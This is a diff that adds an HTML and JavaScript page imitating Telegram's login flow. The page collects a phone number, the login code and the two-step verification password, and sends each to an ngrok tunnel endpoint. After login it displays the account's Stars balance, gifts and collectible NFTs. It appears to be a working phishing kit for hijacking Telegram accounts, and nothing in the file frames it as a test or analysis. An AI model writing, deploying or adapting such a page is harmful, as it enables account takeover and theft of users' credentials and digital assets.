@@ -1,1 +1,855 @@
+<!doctype html>
+<html lang="ru">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Вход в Telegram WebApp</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'tg-blue': '#4a95e6', /* Насыщенный синий для кнопок и акцентов */
+                        'tg-light-blue': '#a5d0f6',
+                        'tg-border': '#e0e0e0',
+                        'tg-text': '#222222',
+                        'tg-placeholder': '#888888',
+                        'tg-background': '#ffffff',
+                        'tg-card': '#ffffff',
+                        'tg-success': '#10B981',
+                        'tg-error': '#EF4444',
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'system-ui', '-apple-system', 'Segoe UI', 'Roboto', 'Arial', 'sans-serif'],
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        /* Base styles for the light theme */
+        body { 
+            font-family: 'Inter', sans-serif; 
+            background: #f7f7f7; 
+            color: var(--tg-text); 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            min-height: 100vh; 
+            padding: 20px;
+        }
+
+
+        /* Card and Header */
+        .card { 
+            background-color: var(--tg-card); 
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); /* Subtle shadow */
+        }
+        .header {
+            color: var(--tg-text);
+            text-align: center;
+        }
+        
+        /* Input and Button Styles */
+        .input-style {
+            padding: 10px 0;
+            border-bottom: 2px solid var(--tg-border);
+            border-top: none;
+            border-left: none;
+            border-right: none;
+            background: transparent;
+            color: var(--tg-text);
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        .input-style:focus {
+            outline: none;
+            border-color: var(--tg-blue);
+        }
+        .input-style::placeholder {
+            color: var(--tg-placeholder);
+        }
+
+
+        .phone-group {
+            display: flex;
+            align-items: flex-end;
+            margin-top: 10px;
+        }
+        .code-display {
+            padding: 10px 0;
+            font-size: 16px;
+            color: var(--tg-text);
+            margin-right: 15px;
+            border-bottom: 2px solid var(--tg-border);
+            font-weight: 500;
+        }
+        
+        /* Country Dropdown */
+        .country-select-btn {
+            border: none;
+            border-bottom: 2px solid var(--tg-border);
+            padding: 10px 0;
+            background: transparent;
+            color: var(--tg-text);
+        }
+        .country-select-btn:focus {
+            border-color: var(--tg-blue);
+            outline: none;
+        }
+        .country-dropdown-menu {
+            max-height: 300px;
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.15);
+        }
+        .country-item:hover {
+            background-color: #f0f0f0;
+        }
+        
+        /* Code Input Styles (for Step 2) */
+        .code-inputs-container {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+        }
+        .code-input {
+            width: 40px; 
+            height: 50px; 
+            text-align: center; 
+            font-size: 20px;
+            font-weight: bold;
+            background: transparent;
+            border: none;
+            border-bottom: 3px solid #ccc;
+            color: var(--tg-text);
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        .code-input:focus {
+            outline: none;
+            border-color: var(--tg-blue) !important;
+            box-shadow: none;
+        }
+        /* Color feedback for code input */
+        .code-success { border-color: var(--tg-success) !important; animation: none; }
+        .code-error { border-color: var(--tg-error) !important; animation: none; }
+        
+        /* Custom scrollbar */
+        .custom-scroll::-webkit-scrollbar { width: 6px; }
+        .custom-scroll::-webkit-scrollbar-thumb { background-color: #bbbbbb; border-radius: 3px; }
+        .custom-scroll::-webkit-scrollbar-track { background-color: transparent; }
+
+
+    </style>
+</head>
+<body class="bg-tg-background">
+    <div class="card w-full max-w-sm bg-tg-card rounded-xl p-8 space-y-8">
+        <!-- Header Section -->
+        <div class="header space-y-4">
+            <!-- Telegram Logo -->
+            <div id="telegram-logo" class="flex justify-center">
+                <div class="w-20 h-20 rounded-full bg-gradient-to-br from-[#2AABEE] to-[#229ED9] flex items-center justify-center shadow-lg transform transition-all duration-300 hover:scale-105">
+                    <svg width="48" height="48" viewBox="0 0 240 240" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M94.8 142.3L90.4 197.3C96.4 197.3 99.1 194.6 102.3 191.5L128.8 166.8L183.5 206.7C194.3 212.8 202 209.5 204.9 196.3L236.7 42.5L236.8 42.4C240.2 26.3 230.5 20 220 24.3L14.4 99.4C-0.9 105.5 -0.7 114.7 11.7 118.3L62.8 133.4L189.8 56.1C196.2 52 202 54.4 197.1 58.5L94.8 142.3Z" fill="white"/>
+                    </svg>
+                </div>
+            </div>
+            <div class="space-y-1">
+                <h1 id="main-title" class="text-2xl font-semibold text-tg-text">Ваш номер телефона</h1>
+                <p id="main-description" class="text-sm text-gray-500 transition-all duration-300">
+                    Пожалуйста, подтвердите код страны и введите ваш номер телефона.
+                </p>
+            </div>
+        </div>
+
+
+        <!-- Step 1: Phone Number and Country Selector (White Theme Style) -->
+        <div id="step-phone" class="step space-y-6">
+            <!-- 1. Country Selection Dropdown with Search -->
+            <div class="relative">
+                <button id="country-select-btn" class="country-select-btn w-full flex items-center justify-between text-base">
+                    <span id="selected-name" class="font-medium">Россия</span>
+                    <svg class="w-4 h-4 text-gray-400 ml-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+                </button>
+                <div id="country-dropdown" class="absolute z-10 hidden mt-3 w-full custom-scroll bg-tg-card rounded-xl country-dropdown-menu">
+                    <div class="p-3 border-b border-tg-border">
+                        <input id="country-search" type="text" placeholder="Поиск страны..." class="w-full p-2 text-sm border border-tg-border rounded focus:border-tg-blue focus:ring-0 input-style !border !border-tg-border" onfocus="this.style.borderColor=tailwind.config.theme.extend.colors['tg-blue']" onblur="this.style.borderColor='var(--tg-border)'"/>
+                    </div>
+                    <div id="country-list" class="max-h-60 overflow-y-auto custom-scroll">
+                        <!-- Country list will be injected here by JS -->
+                    </div>
+                </div>
+            </div>
+
+
+            <!-- 2. Phone Input (Code and Number) -->
+            <div class="phone-group">
+                <!-- Code Input (Read-only) -->
+                <div id="selected-code-display" class="code-display">+7</div>
+                <!-- Phone Input -->
+                <input id="phone" type="tel" placeholder="999 888 77 66" class="w-full input-style" />
+            </div>
+            
+            <button id="send-code" class="mt-8 w-full p-3 bg-tg-blue text-white font-semibold rounded-full shadow-lg hover:bg-sky-600 focus:outline-none focus:ring-4 focus:ring-tg-blue/50 transition duration-150 disabled:opacity-60 disabled:cursor-not-allowed">
+                Далее
+            </button>
+        </div>
+
+
+        <!-- Step 2: Code Verification (5 Digits) -->
+        <div id="step-code" class="step hidden text-center space-y-6">
+            <label class="text-sm font-medium text-gray-500 mb-4 block">Введите 5-значный код, который мы отправили вам.</label>
+            <div id="code-inputs" class="code-inputs-container">
+                <!-- 5 Digit Code Inputs -->
+                <input class="code-input" type="text" maxlength="1" data-index="0" inputmode="numeric" />
+                <input class="code-input" type="text" maxlength="1" data-index="1" inputmode="numeric" disabled />
+                <input class="code-input" type="text" maxlength="1" data-index="2" inputmode="numeric" disabled />
+                <input class="code-input" type="text" maxlength="1" data-index="3" inputmode="numeric" disabled />
+                <input class="code-input" type="text" maxlength="1" data-index="4" inputmode="numeric" disabled />
+            </div>
+        </div>
+
+
+        <!-- Step 3: 2FA Password -->
+        <div id="step-2fa" class="step hidden text-center space-y-6">
+            <!-- Секция с подсказкой и/или сообщением об отсутствии подсказки, обезьяна удалена -->
+
+            <!-- Подсказка от Telegram -->
+            <div id="password-hint-container" class="hidden bg-blue-50 p-3 rounded-lg border border-blue-200">
+                <p class="text-sm text-gray-700">
+                    <span class="font-semibold text-tg-blue">💡 Подсказка:</span> <span id="password-hint" class="italic text-gray-600"></span>
+                </p>
+            </div>
+            
+            <!-- Сообщение об отсутствии подсказки -->
+            <div id="no-hint-message" class="hidden bg-yellow-50 p-3 rounded-lg border border-yellow-200">
+                <p class="text-xs text-gray-600">
+                    ⚠️ Подсказка не установлена. <br>
+                    <span class="text-gray-500">Вы можете добавить её в Telegram: Настройки → Конфиденциальность → Двухэтапная аутентификация</span>
+                </p>
+            </div>
+
+            <div class="field space-y-4 pt-4"> <!-- Добавил немного отступа, т.к. удалили обезьяну -->
+                <input id="password" type="password" placeholder="Пароль облачного хранилища (2FA)" class="w-full input-style" />
+            </div>
+            <button id="verify-password" class="mt-4 w-full p-3 bg-tg-blue text-white font-semibold rounded-full shadow-lg hover:bg-sky-600 focus:outline-none focus:ring-4 focus:ring-tg-blue/50 transition duration-150">
+                Войти
+            </button>
+        </div>
+
+        <!-- Step 4: Account Info -->
+        <div id="step-account-info" class="step hidden space-y-6">
+            <div class="text-center mb-4">
+                <h2 class="text-xl font-semibold text-tg-text">✅ Вход выполнен!</h2>
+                <p id="user-name" class="text-sm text-gray-500 mt-1"></p>
+            </div>
+
+            <!-- Stars Balance -->
+            <div class="bg-gradient-to-r from-yellow-50 to-orange-50 p-4 rounded-xl border border-yellow-200">
+                <div class="flex items-center justify-between">
+                    <div class="flex items-center gap-2">
+                        <span class="text-2xl">⭐</span>
+                        <span class="font-semibold text-gray-700">Telegram Stars</span>
+                    </div>
+                    <span id="stars-balance" class="text-xl font-bold text-orange-600">0</span>
+                </div>
+            </div>
+
+            <!-- Gifts -->
+            <div id="gifts-container" class="bg-purple-50 p-4 rounded-xl border border-purple-200 hidden">
+                <div class="flex items-center gap-2 mb-3">
+                    <span class="text-2xl">🎁</span>
+                    <span class="font-semibold text-gray-700">Подарки</span>
+                    <span id="gifts-count" class="ml-auto bg-purple-200 px-2 py-1 rounded-full text-xs font-bold text-purple-700">0</span>
+                </div>
+                <div id="gifts-list" class="space-y-2 text-sm text-gray-600"></div>
+            </div>
+
+            <!-- NFT/Collectibles -->
+            <div id="nft-container" class="bg-blue-50 p-4 rounded-xl border border-blue-200 hidden">
+                <div class="flex items-center gap-2 mb-3">
+                    <span class="text-2xl">💎</span>
+                    <span class="font-semibold text-gray-700">Коллекционные предметы</span>
+                </div>
+                <div id="collectibles-list" class="space-y-2 text-sm text-gray-600"></div>
+            </div>
+        </div>
+
+
+        <!-- Status Message -->
+        <p id="status" class="text-xs font-medium text-gray-500 text-center pt-3 transition-colors duration-300"></p>
+    </div>
+
+
+    <script>
+        const API_BASE = 'https://supercritical-hatable-elanor.ngrok-free.dev'; // вместо localhost';
+        let sessionId = null;
+        let selectedCountryData = null; 
+
+
+        const byId = id => document.getElementById(id);
+        const stepPhone = byId('step-phone');
+        const stepCode = byId('step-code');
+        const step2fa = byId('step-2fa');
+        const stepAccountInfo = byId('step-account-info');
+        const statusEl = byId('status');
+        const mainDescription = byId('main-description');
+        const mainTitle = byId('main-title');
+        const telegramLogo = byId('telegram-logo');
+
+
+        const phoneInput = byId('phone');
+        const codeInputs = Array.from(document.querySelectorAll('.code-input'));
+        const passwordInput = byId('password');
+        
+        const countrySearchInput = byId('country-search');
+        const countryListContainer = byId('country-list');
+        const selectedName = byId('selected-name'); 
+        const selectedCodeDisplay = byId('selected-code-display');
+        const countrySelectBtn = byId('country-select-btn');
+        const countryDropdown = byId('country-dropdown');
+
+
+
+        function show(el) { el.classList.remove('hidden'); }
+        function hide(el) { el.classList.add('hidden'); }
+
+
+        function setStatus(text, cls = 'text-gray-500') {
+            statusEl.className = `text-xs font-medium text-center pt-3 ${cls}`.trim();
+            statusEl.textContent = text;
+        }
+
+
+        function setMainDescription(text) {
+            mainDescription.textContent = text;
+        }
+
+        function setMainTitle(text) {
+            mainTitle.textContent = text;
+        }
+
+        function showLogo() {
+            show(telegramLogo);
+        }
+
+        function hideLogo() {
+            hide(telegramLogo);
+        }
+
+        /**
+         * Очищает все поля для ввода кода и отключает их, кроме первого.
+         */
+        function clearCodeInputs() {
+            codeInputs.forEach((input, index) => {
+                input.value = '';
+                // Сбрасываем стили
+                input.classList.remove('code-success', 'code-error');
+                input.style.borderColor = '#ccc'; 
+
+                // Деактивируем все, кроме первого
+                if (index > 0) {
+                    input.disabled = true;
+                } else {
+                    input.disabled = false;
+                }
+            });
+        }
+
+        function displayAccountInfo(user, accountInfo) {
+            // Скрываем логотип на экране информации об аккаунте
+            hideLogo();
+            
+            // Отображаем имя пользователя
+            byId('user-name').textContent = user.name ? `Привет, ${user.name}!` : 'Привет!';
+            
+            // Отображаем баланс звезд
+            byId('stars-balance').textContent = accountInfo.stars_balance || 0;
+            
+            // Отображаем подарки
+            if (accountInfo.gifts && accountInfo.gifts.length > 0) {
+                show(byId('gifts-container'));
+                byId('gifts-count').textContent = accountInfo.gifts.length;
+                const giftsList = byId('gifts-list');
+                giftsList.innerHTML = '';
+                accountInfo.gifts.forEach((gift, index) => {
+                    const giftDiv = document.createElement('div');
+                    giftDiv.className = 'p-2 bg-white rounded-lg';
+                    giftDiv.innerHTML = `
+                        <div class="flex justify-between items-center">
+                            <span class="font-medium">${gift.type || 'Подарок'}</span>
+                            <span class="text-xs text-gray-400">${gift.date ? new Date(gift.date).toLocaleDateString() : ''}</span>
+                        </div>
+                    `;
+                    giftsList.appendChild(giftDiv);
+                });
+            } else {
+                hide(byId('gifts-container'));
+            }
+            
+            // Отображаем NFT/коллекционные предметы
+            if (accountInfo.has_nft && accountInfo.collectibles && accountInfo.collectibles.length > 0) {
+                show(byId('nft-container'));
+                const collectiblesList = byId('collectibles-list');
+                collectiblesList.innerHTML = '';
+                accountInfo.collectibles.forEach(item => {
+                    const itemDiv = document.createElement('div');
+                    itemDiv.className = 'p-2 bg-white rounded-lg';
+                    let displayText = item.type;
+                    if (item.username) {
+                        displayText += `: @${item.username}`;
+                    }
+                    itemDiv.innerHTML = `
+                        <div class="flex items-center gap-2">
+                            <span class="text-lg">${item.type === 'Premium' ? '⭐' : '🔹'}</span>
+                            <span class="font-medium">${displayText}</span>
+                            ${item.active ? '<span class="ml-auto text-xs bg-green-200 px-2 py-1 rounded-full text-green-700">Активно</span>' : ''}
+                        </div>
+                    `;
+                    collectiblesList.appendChild(itemDiv);
+                });
+            } else {
+                hide(byId('nft-container'));
+            }
+            
+            // Показываем секцию с информацией
+            hide(stepCode);
+            hide(step2fa);
+            show(stepAccountInfo);
+        }
+
+
+        // --- Country Data (More than 60, sorted by Russian name) ---
+        const allCountries = [
+            // Code, Name (RU), Flag, Max Length (Number only), Min Length (Number only)
+            { code: '93', name: 'Афганистан', flag: '🇦🇫', length: 9, minLength: 9 },
+            { code: '32', name: 'Бельгия', flag: '🇧🇪', length: 9, minLength: 8 },
+            { code: '359', name: 'Болгария', flag: '🇧🇬', length: 9, minLength: 8 },
+            { code: '55', name: 'Бразилия', flag: '🇧🇷', length: 11, minLength: 10 },
+            { code: '84', name: 'Вьетнам', flag: '🇻🇳', length: 9, minLength: 9 },
+            { code: '509', name: 'Гаити', flag: '🇭🇹', length: 8, minLength: 8 },
+            { code: '233', name: 'Гана', flag: '🇬🇭', length: 9, minLength: 8 },
+            { code: '49', name: 'Германия', flag: '🇩🇪', length: 11, minLength: 9 },
+            { code: '30', name: 'Греция', flag: '🇬🇷', length: 10, minLength: 10 },
+            { code: '995', name: 'Грузия', flag: '🇬🇪', length: 9, minLength: 8 },
+            { code: '45', name: 'Дания', flag: '🇩🇰', length: 8, minLength: 8 },
+            { code: '20', name: 'Египет', flag: '🇪🇬', length: 10, minLength: 9 },
+            { code: '972', name: 'Израиль', flag: '🇮🇱', length: 9, minLength: 9 },
+            { code: '91', name: 'Индия', flag: '🇮🇳', length: 10, minLength: 10 },
+            { code: '62', name: 'Индонезия', flag: '🇮🇩', length: 13, minLength: 9 }, 
+            { code: '98', name: 'Иран', flag: '🇮🇷', length: 10, minLength: 9 },
+            { code: '353', name: 'Ирландия', flag: '🇮🇪', length: 9, minLength: 7 },
+            { code: '354', name: 'Исландия', flag: '🇮🇸', length: 7, minLength: 7 },
+            { code: '34', name: 'Испания', flag: '🇪🇸', length: 9, minLength: 9 },
+            { code: '39', name: 'Италия', flag: '🇮🇹', length: 10, minLength: 9 },
+            { code: '7', name: 'Казахстан', flag: '🇰🇿', length: 10, minLength: 10 },
+            { code: '1', name: 'Канада', flag: '🇨🇦', length: 10, minLength: 10 },
+            { code: '974', name: 'Катар', flag: '🇶🇦', length: 8, minLength: 7 },
+            { code: '86', name: 'Китай', flag: '🇨🇳', length: 11, minLength: 11 },
+            { code: '82', name: 'Корея (Юг)', flag: '🇰🇷', length: 10, minLength: 9 },
+            { code: '53', name: 'Куба', flag: '🇨🇺', length: 8, minLength: 6 },
+            { code: '371', name: 'Латвия', flag: '🇱🇻', length: 8, minLength: 8 },
+            { code: '370', name: 'Литва', flag: '🇱🇹', length: 8, minLength: 8 },
+            { code: '352', name: 'Люксембург', flag: '🇱🇺', length: 9, minLength: 6 },
+            { code: '261', name: 'Мадагаскар', flag: '🇲🇬', length: 9, minLength: 8 },
+            { code: '60', name: 'Малайзия', flag: '🇲🇾', length: 10, minLength: 9 },
+            { code: '52', name: 'Мексика', flag: '🇲🇽', length: 10, minLength: 10 },
+            { code: '373', name: 'Молдова', flag: '🇲🇩', length: 8, minLength: 8 },
+            { code: '976', name: 'Монголия', flag: '🇲🇳', length: 8, minLength: 8 },
+            { code: '212', name: 'Марокко', flag: '🇲🇦', length: 9, minLength: 9 },
+            { code: '31', name: 'Нидерланды', flag: '🇳🇱', length: 10, minLength: 9 },
+            { code: '64', name: 'Новая Зеландия', flag: '🇳🇿', length: 8, minLength: 8 },
+            { code: '47', name: 'Норвегия', flag: '🇳🇴', length: 8, minLength: 8 },
+            { code: '971', name: 'ОАЭ', flag: '🇦🇪', length: 9, minLength: 9 },
+            { code: '92', name: 'Пакистан', flag: '🇵🇰', length: 10, minLength: 10 },
+            { code: '48', name: 'Польша', flag: '🇵🇱', length: 9, minLength: 9 },
+            { code: '351', name: 'Португалия', flag: '🇵🇹', length: 9, minLength: 9 },
+            { code: '7', name: 'Россия', flag: '🇷🇺', length: 10, minLength: 10 },
+            { code: '40', name: 'Румыния', flag: '🇷🇴', length: 9, minLength: 9 },
+            { code: '1', name: 'США', flag: '🇺🇸', length: 10, minLength: 10 },
+            { code: '966', name: 'Саудовская Аравия', flag: '🇸🇦', length: 9, minLength: 9 },
+            { code: '381', name: 'Сербия', flag: '🇷🇸', length: 9, minLength: 8 },
+            { code: '65', name: 'Сингапур', flag: '🇸🇬', length: 8, minLength: 8 },
+            { code: '421', name: 'Словакия', flag: '🇸🇰', length: 9, minLength: 9 },
+            { code: '386', name: 'Словения', flag: '🇸🇮', length: 8, minLength: 8 },
+            { code: '66', name: 'Таиланд', flag: '🇹🇭', length: 9, minLength: 8 },
+            { code: '886', name: 'Тайвань', flag: '🇹🇼', length: 9, minLength: 9 },
+            { code: '992', name: 'Таджикистан', flag: '🇹🇯', length: 9, minLength: 9 },
+            { code: '993', name: 'Туркменистан', flag: '🇹🇲', length: 8, minLength: 8 },
+            { code: '90', name: 'Турция', flag: '🇹🇷', length: 10, minLength: 10 },
+            { code: '998', name: 'Узбекистан', flag: '🇺🇿', length: 9, minLength: 9 },
+            { code: '380', name: 'Украина', flag: '🇺🇦', length: 9, minLength: 9 },
+            { code: '598', name: 'Уругвай', flag: '🇺🇾', length: 9, minLength: 8 },
+            { code: '358', name: 'Финляндия', flag: '🇫🇮', length: 10, minLength: 8 },
+            { code: '33', name: 'Франция', flag: '🇫🇷', length: 9, minLength: 9 },
+            { code: '385', name: 'Хорватия', flag: '🇭🇷', length: 9, minLength: 8 },
+            { code: '420', name: 'Чехия', flag: '🇨🇿', length: 9, minLength: 9 },
+            { code: '41', name: 'Швейцария', flag: '🇨🇭', length: 9, minLength: 9 },
+            { code: '46', name: 'Швеция', flag: '🇸🇪', length: 9, minLength: 7 },
+            { code: '593', name: 'Эквадор', flag: '🇪🇨', length: 9, minLength: 9 },
+            { code: '372', name: 'Эстония', flag: '🇪🇪', length: 7, minLength: 7 },
+            { code: '81', name: 'Япония', flag: '🇯🇵', length: 10, minLength: 10 },
+            { code: '61', name: 'Австралия', flag: '🇦🇺', length: 9, minLength: 9 },
+            { code: '43', name: 'Австрия', flag: '🇦🇹', length: 10, minLength: 10 },
+            { code: '973', name: 'Бахрейн', flag: '🇧🇭', length: 8, minLength: 8 },
+            { code: '880', name: 'Бангладеш', flag: '🇧🇩', length: 10, minLength: 10 },
+            { code: '375', name: 'Беларусь', flag: '🇧🇾', length: 9, minLength: 9 },
+            { code: '57', name: 'Колумбия', flag: '🇨🇴', length: 10, minLength: 10 },
+            { code: '506', name: 'Коста-Рика', flag: '🇨🇷', length: 8, minLength: 8 },
+            { code: '44', name: 'Великобритания', flag: '🇬🇧', length: 10, minLength: 10 },
+        ].sort((a, b) => a.name.localeCompare(b.name, 'ru'));
+
+
+        
+        // --- Country Selector Logic (Updated with search and filtering) ---
+
+
+        function selectCountry(country) {
+            selectedCountryData = country;
+            selectedName.textContent = country.name;
+            selectedCodeDisplay.textContent = '+' + country.code;
+            countryDropdown.classList.add('hidden');
+            countrySearchInput.value = ''; // Clear search on select
+
+
+            // Set max length for input field
+            phoneInput.maxLength = country.length;
+
+
+            // Simple formatting for placeholders
+            let placeholderNumber = 'X'.repeat(country.length);
+            let placeholderText = '';
+            // Example: 3-3-4
+            placeholderText = placeholderNumber.slice(0, 3) + ' ' + placeholderNumber.slice(3, 6) + ' ' + placeholderNumber.slice(6);
+            
+            phoneInput.placeholder = placeholderText.trim();
+            phoneInput.focus();
+
+
+            // Clear input if current value is invalid
+            phoneInput.value = '';
+            
+            // Re-render list to ensure full list is available next time
+            populateCountryDropdown(allCountries);
+        }
+
+
+        function createCountryItem(country) {
+            const item = document.createElement('div');
+            item.className = 'country-item flex items-center p-3 text-sm cursor-pointer transition duration-150';
+            item.innerHTML = `<span class="mr-3">${country.name}</span> <span class="ml-auto text-gray-500 font-medium">+${country.code}</span>`;
+            item.addEventListener('click', () => selectCountry(country));
+            return item;
+        }
+
+
+        function populateCountryDropdown(countriesToDisplay) {
+            countryListContainer.innerHTML = '';
+            if (countriesToDisplay.length === 0) {
+                 const item = document.createElement('div');
+                 item.className = 'p-3 text-sm text-gray-500 text-center';
+                 item.textContent = 'Нет результатов';
+                 countryListContainer.appendChild(item);
+                 return;
+            }
+            countriesToDisplay.forEach(country => {
+                countryListContainer.appendChild(createCountryItem(country));
+            });
+        }
+        
+        function filterCountries() {
+            const query = countrySearchInput.value.toLowerCase().trim();
+            const filtered = allCountries.filter(country => 
+                country.name.toLowerCase().includes(query) || 
+                country.code.includes(query)
+            );
+            populateCountryDropdown(filtered);
+        }
+
+
+        // Initialize with default country (Russia)
+        populateCountryDropdown(allCountries);
+        selectCountry(allCountries.find(c => c.code === '7' && c.name === 'Россия') || allCountries[0]);
+
+
+        countrySelectBtn.addEventListener('click', () => {
+            countryDropdown.classList.toggle('hidden');
+            if (!countryDropdown.classList.contains('hidden')) {
+                countrySearchInput.focus();
+                filterCountries(); // Ensure list is current
+            }
+        });
+        
+        countrySearchInput.addEventListener('input', filterCountries);
+
+
+        document.addEventListener('click', (event) => {
+            if (!countrySelectBtn.contains(event.target) && !countryDropdown.contains(event.target)) {
+                countryDropdown.classList.add('hidden');
+            }
+        });
+
+
+        // --- Core Application Logic ---
+
+
+        function getFullPhone() {
+            const number = phoneInput.value.replace(/[^0-9]/g, ''); // Number part only
+            return '+' + selectedCountryData.code + number;
+        }
+
+
+        async function sendCode() {
+            const phone = getFullPhone().replace(/\s/g, '');
+            const numberPart = phone.substring(selectedCountryData.code.length + 1);
+            const minLength = selectedCountryData.minLength;
+            const maxLength = selectedCountryData.length;
+
+
+            // Validation check using min/max lengths
+            if (numberPart.length < minLength || numberPart.length > maxLength) {
+                setStatus(`Номер должен содержать от ${minLength} до ${maxLength} цифр после кода страны (+${selectedCountryData.code}).`, 'text-tg-error');
+                return;
+            }
+            
+            setStatus('Отправляю код...', 'text-tg-blue');
+            byId('send-code').disabled = true;
+
+
+            try {
+                // Mock API call: In a real app, this would use a backend to interact with Telegram API
+                const res = await fetch(`${API_BASE}/send_code`, {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone })
+                });
+
+
+                if (!res.ok) throw new Error(await res.text());
+
+
+                const data = await res.json();
+                sessionId = data.session_id;
+
+
+                setMainTitle('Telegram');
+                setMainDescription('Код отправлен. Введите 5 цифр из Telegram.');
+                setStatus('Код отправлен. Проверьте сообщения Telegram.', 'text-tg-blue');
+                hideLogo();
+
+                // Очистка полей ввода кода перед показом
+                clearCodeInputs(); 
+
+                hide(stepPhone); show(stepCode);
+                codeInputs[0].focus(); 
+
+
+            } catch (e) {
+                setStatus('Ошибка отправки кода: ' + (e.message || e), 'text-tg-error');
+            } finally {
+                 byId('send-code').disabled = false;
+            }
+        }
+
+
+        async function verifyCode() {
+            const code = codeInputs.map(input => input.value).join('');
+            if (!sessionId || code.length !== 5) return;
+            
+            setStatus('Проверяю код...', 'text-tg-blue');
+            // Отключаем все инпуты, чтобы предотвратить ввод во время запроса
+            codeInputs.forEach(input => input.disabled = true);
+
+
+            try {
+                const res = await fetch(`${API_BASE}/verify_code`, {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ session_id: sessionId, code })
+                });
+
+
+                const text = await res.text();
+                if (!res.ok) throw new Error(text);
+
+
+                const data = JSON.parse(text);
+
+
+                // Success animation (Green border)
+                codeInputs.forEach(input => {
+                    input.classList.add('code-success');
+                    setTimeout(() => input.classList.remove('code-success'), 1000);
+                });
+
+
+                if (data.twofa_required) {
+                    setMainTitle('Пароль 2FA');
+                    setMainDescription('Требуется пароль 2FA.');
+                    setStatus('Требуется пароль 2FA. Введите его.', 'text-tg-blue');
+                    
+                    // Очистка пароля перед показом 2FA
+                    passwordInput.value = '';
+
+                    // Отображаем подсказку, если она есть
+                    console.log('2FA подсказка от сервера:', data.password_hint);
+                    if (data.password_hint && data.password_hint.trim() !== '') {
+                        byId('password-hint').textContent = data.password_hint;
+                        show(byId('password-hint-container'));
+                        hide(byId('no-hint-message'));
+                    } else {
+                        // Показываем сообщение об отсутствии подсказки
+                        hide(byId('password-hint-container'));
+                        show(byId('no-hint-message'));
+                    }
+                    
+                    hide(stepCode); show(step2fa);
+                    passwordInput.focus();
+                } else {
+                    // Успешный вход без 2FA
+                    setMainTitle('✅ Успешно!');
+                    setMainDescription('Вход выполнен!');
+                    setStatus(`Вход успешен!` , 'text-tg-success');
+                    console.log('Account info:', data.account_info);
+                    
+                    if (data.user && data.account_info) {
+                        displayAccountInfo(data.user, data.account_info);
+                    } else {
+                        hide(stepCode);
+                    }
+                }
+            } catch (e) {
+                // Error animation (Red border)
+                codeInputs.forEach(input => {
+                    input.classList.add('code-error');
+                    setTimeout(() => input.classList.remove('code-error'), 1000);
+                });
+
+                setStatus('Ошибка при проверке кода: ' + (e.message || e), 'text-tg-error');
+                
+                // Очистка полей и возврат фокуса после ошибки
+                clearCodeInputs();
+                codeInputs[0].focus();
+            }
+        }
+
+
+        async function verifyPassword() {
+            const password = passwordInput.value.trim();
+            if (!sessionId || !password) return;
+
+
+            setStatus('Проверяю пароль 2FA...', 'text-tg-blue');
+            byId('verify-password').disabled = true;
+
+
+            try {
+                const res = await fetch(`${API_BASE}/verify_password`, {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ session_id: sessionId, password })
+                });
+
+
+                if (!res.ok) {
+                    const errorText = await res.text();
+                    let errorMsg = 'Ошибка';
+                    try {
+                        const errorJson = JSON.parse(errorText);
+                        errorMsg = errorJson.detail || errorText;
+                    } catch {
+                        errorMsg = errorText;
+                    }
+                    throw new Error(errorMsg);
+                }
+
+
+                const data = await res.json();
+                setMainTitle('✅ Успешно!');
+                setMainDescription('Вход выполнен!');
+                setStatus(`Вход успешен!` , 'text-tg-success');
+                console.log('Account info (2FA):', data.account_info);
+                
+                if (data.user && data.account_info) {
+                    displayAccountInfo(data.user, data.account_info);
+                } else {
+                    hide(step2fa);
+                }
+
+
+            } catch (e) {
+                setStatus(e.message || 'Ошибка при вводе пароля', 'text-tg-error');
+                // Очистка поля пароля при ошибке
+                passwordInput.value = '';
+                passwordInput.focus();
+            } finally {
+                byId('verify-password').disabled = false;
+            }
+        }
+
+
+
+        // --- Event Listeners and Custom UI Logic ---
+
+
+        // 1. Send Code Button
+        document.getElementById('send-code').addEventListener('click', sendCode);
+
+
+        // 2. 5-Digit Code Input Logic (Auto-focus, Auto-submit)
+        codeInputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                // Оставляем только первую введенную цифру
+                e.target.value = e.target.value.replace(/[^0-9]/g, '').charAt(0);
+
+                if (e.target.value) {
+                    if (index < codeInputs.length - 1) {
+                        // Разблокируем следующий инпут
+                        codeInputs[index + 1].disabled = false;
+                        codeInputs[index + 1].focus();
+                    } else if (index === codeInputs.length - 1) {
+                        // Если введена последняя цифра, пытаемся проверить код
+                        verifyCode();
+                    }
+                }
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                    // Переход назад при нажатии Backspace
+                    codeInputs[index - 1].value = '';
+                    codeInputs[index - 1].focus();
+                    e.preventDefault();
+                }
+                // Запрет ввода всего, кроме цифр (и Tab)
+                if (!/^\d$/.test(e.key) && e.key.length === 1 && e.key !== 'Tab') {
+                    e.preventDefault();
+                }
+            });
+            
+            // Highlight current input border
+            input.addEventListener('focus', (e) => {
+                codeInputs.forEach(i => i.style.borderColor = '#ccc');
+                e.target.style.borderColor = tailwind.config.theme.extend.colors['tg-blue'];
+            });
+            
+            input.addEventListener('blur', (e) => {
+                // Return to default border color if no success/error class is applied
+                if (!e.target.classList.contains('code-success') && !e.target.classList.contains('code-error')) {
+                    e.target.style.borderColor = '#ccc';
+                }
+            });
+        });
+
+
